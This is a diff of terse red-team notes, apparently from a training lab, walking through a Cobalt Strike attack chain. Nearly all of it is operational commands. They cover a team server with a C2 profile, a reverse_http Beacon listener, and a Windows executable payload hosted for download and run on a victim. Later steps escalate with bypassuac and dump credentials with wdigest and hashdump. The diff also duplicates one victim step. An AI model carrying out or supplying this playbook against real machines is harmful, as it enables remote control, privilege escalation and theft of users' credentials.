@@ -1,21 +1,31 @@
 Cobalt Strike
 
 
+cd /opt/cobaltstrike/
+./update
+
 Team Server
-     ./teamserver <IP> <password> <C2 profile>
-     ./teamserver 10.10.215.21 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile.
+     ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons>
+     The first 2 parameters are required, while the second 2 are optional.
+     ./teamserver 10.10.215.21 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+     Note the SHA256 hash, send to other members of your team.
 
 Attack VM
      ./cobaltstrike
+     Host: IP of team server
+     Port: 50050
+     User: Nickname
+     Password: Shared password for the team server
      Connect
+     VerifyFingerprint (compare with the SHA256 hash) > Yes
 
 CobaltStrike > Listeners > Add
      Name: http
      Payload: windows/beacon_http/reverse_http
-     Host: <IP of Team Server>
+     Host: <IP of team server>
      Port: 80
      Save
-     Use default IP of the Team Server > Ok > Ok
+     Use default IP of the team server > Ok > Ok
 
 Attacks > Packages > Windows Executable
      Listener: http
@@ -30,16 +40,20 @@ cd /root/
 mkdir demo
 mv artifact.exe demo/
 cd /root/demo/
-python -m SimpleHTTPServer
+python -m SimpleHTTPServer 80
 
 Victim VM
-Open a web browser http://<Team Server IP>:8000
-Click artifact.exe to download.
-Double click artifact.exe and you should get the callback.
+     Open a web browser to http://<team server IP>
+Victim VM
+     Open a web browser to http://<team server IP>
+     Click artifact.exe to download.
+     Double click artifact.exe and you should get the callback.
 
-Right click on the computer in the top pane > Interact
-sleep 0                                           Make the beacon interactive.
-shell whoami /groups
+Select the computer in the top pane.
+     Right click > Session > Note                 Lee - initial access
+     Right click > Interact
+     sleep 0                                      Make the Beacon interactive.
+     shell whoami /groups
 
 Cobalt Strike > Listeners > Add
      Name: smb-pipe
@@ -52,7 +66,7 @@ Select the Beacon tab
 bypassuac smb-pipe                                You should now be in a high integrity context.
 
 Right click on the new computer in the top pane > Interact
-sleep 0                                           Make the beacon interactive.
+sleep 0                                           Make the Beacon interactive.
 ps                                                Look at the processes and for interesting tokens.
 wdigest                                           See if there are any interesting credentials.
 hashdump                                          Dump the hashes.
